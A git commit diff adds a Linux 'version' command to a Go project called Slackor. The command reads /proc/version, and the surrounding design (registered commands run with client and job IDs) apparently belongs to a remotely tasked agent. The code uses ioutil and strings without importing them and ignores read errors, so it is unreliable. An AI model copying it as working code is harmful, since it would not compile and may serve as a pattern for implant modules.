fde98ced1d0db0b3af098ce82cae0a0064c75a48
n00py <n00py@protonmail.com>
2020-01-23 22:22:48 -0700

    Added Linux version info

--- pkg/linux/version.go
+++ pkg/linux/version.go
@@ -1,1 +1,29 @@
+// +build linux
+
 package linux
+
+import (
+	"github.com/n00py/Slackor/internal/config"
+	"github.com/n00py/Slackor/pkg/command"
+)
+
+// Version gets the OS version
+type Version struct{}
+
+// Name is the name of the command
+func (ver Version) Name() string {
+	return "version"
+}
+
+// Run gets the OS version
+func (ver Version) Run(clientID string, jobID string, args []string) (string, error) {
+	path := "/proc/version"
+	content, _ := ioutil.ReadFile(path)
+	version := strings.Split(string(content), "(")
+	config.OSVersion = version[0]
+	return config.OSVersion, nil
+}
+
+func init() {
+	command.RegisterCommand(Version{})
+}
